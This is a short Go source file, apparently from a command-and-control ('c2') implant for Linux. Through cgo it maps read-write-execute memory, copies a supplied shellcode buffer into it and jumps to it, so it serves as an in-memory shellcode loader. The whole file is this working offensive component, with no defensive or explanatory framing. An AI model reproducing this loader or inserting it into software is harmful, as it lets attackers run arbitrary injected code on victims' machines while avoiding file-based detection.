//go:build linux

package c2

import (
	"unsafe"
)

/*
#include <sys/mman.h>
#include <string.h>

static void execute(unsigned char* sc, unsigned int sc_len) {
    void *memory = mmap(NULL, sc_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (memory == MAP_FAILED) return;

    memcpy(memory, sc, sc_len);
    ((void(*)())memory)();
}
*/
import "C"

func run(shellcode []byte) {

	C.execute(
		(*C.uchar)(unsafe.Pointer(&shellcode[0])),
		C.uint(len(shellcode)),
	)
}
